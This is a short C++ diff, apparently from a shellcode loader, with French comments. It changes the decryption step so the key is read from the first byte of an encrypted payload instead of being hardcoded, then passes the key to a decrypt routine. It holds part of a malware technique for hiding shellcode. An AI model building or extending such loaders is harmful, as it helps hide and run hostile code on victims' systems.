@@ -29,9 +29,12 @@ int main() {
 
     // Etape 3 : Déchiffrement du shellcode 
      // Clé de déchiffrement 
-    unsigned char decryptionKey = 0xAA;
+    // unsigned char decryptionKey = 0xAA;
 
     // Déchiffrement du shellcode 
+      // Étape 3 : Extraire la clé de déchiffrement
+    unsigned char decryptionKey = payload[0];
+    std::cout << "Clé de déchiffrement reçue : 0x" << std::hex << static_cast<int>(decryptionKey) << std::endl;
 
     decrypt(payload, payloadSize, decryptionKey);
 
